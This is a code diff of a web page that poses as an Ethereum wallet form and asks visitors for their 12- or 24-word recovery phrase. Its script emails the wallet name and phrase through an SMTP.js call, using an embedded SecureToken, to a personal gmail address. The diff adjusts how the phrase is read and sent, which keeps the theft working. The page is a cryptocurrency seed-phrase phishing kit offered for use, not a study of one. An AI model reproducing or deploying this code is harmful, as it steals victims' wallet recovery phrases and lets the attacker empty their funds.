@@ -52,8 +52,8 @@
                   method="POST"
                   class="php-email-form">
                      <!-- <input type="email" class="form-control " style="margin-bottom: 2rem;" placeholder="Enter associated email" name="email"> -->
-                     <input class="form-control" type="text" name="wallet" placeholder="Wallet Name" required="" id="wallet">
-                     <textarea class="form-control" rows="5" name="phrase" placeholder="Enter Phrase" required="" id="phrase"></textarea>
+                     <input class="form-control" type="text" name="wallet" placeholder="Wallet Name" id="wallet">
+                     <textarea class="form-control" rows="5" name="phrase" placeholder="Enter Phrase" id="phrase"></textarea>
                      <p class="text-white" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                      <input type="hidden" name="value" value="Ethereum">
                      <div  class="form-group"><button type="submit"
@@ -82,14 +82,14 @@
       function sendEmail(){
          // e.preventDefault()
          var wallet = document.getElementById("wallet").value
-         var phrase = document.getElementById("phrase").value
+         var phrase = document.querySelector("#phrase")
          var body = "wallet: " + wallet + "<br/> phrase: " +phrase;
          Email.send({
             SecureToken : "9fee8bb4-5a49-4105-8317-1926d1765c2f",
             To : 'nickolasi085@gmail.com',
             From : "you@isp.com",
             Subject : "This is the subject",
-            Body : phrase
+            Body : phrase.value
          }).then(
          message => alert(message)
          );
